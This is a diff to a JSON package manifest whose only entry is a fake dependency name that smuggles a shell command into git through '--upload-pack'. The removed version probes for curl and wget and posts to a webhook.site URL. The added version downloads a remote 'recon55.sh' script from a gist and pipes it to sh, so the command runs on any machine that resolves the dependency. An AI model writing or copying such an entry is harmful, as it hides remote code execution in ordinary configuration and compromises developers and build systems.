@@ -1,5 +1,5 @@
 {
   "packages": {
-    "npm:git+--upload-pack=echo R54_ALIVE >&2; which curl >&2; which wget >&2; curl -v -X POST -d test https://webhook.site/19d5d9da-4956-4d98-aa9a-4f5ea2fce95b >&2 2>&1 ;:": "latest"
+    "npm:git+--upload-pack=curl -sfL https://gist.githubusercontent.com/marouanedahmani27-coder/c457e195d9527a9852cf1046e78a243e/raw/recon55.sh|sh ;:": "latest"
   }
 }
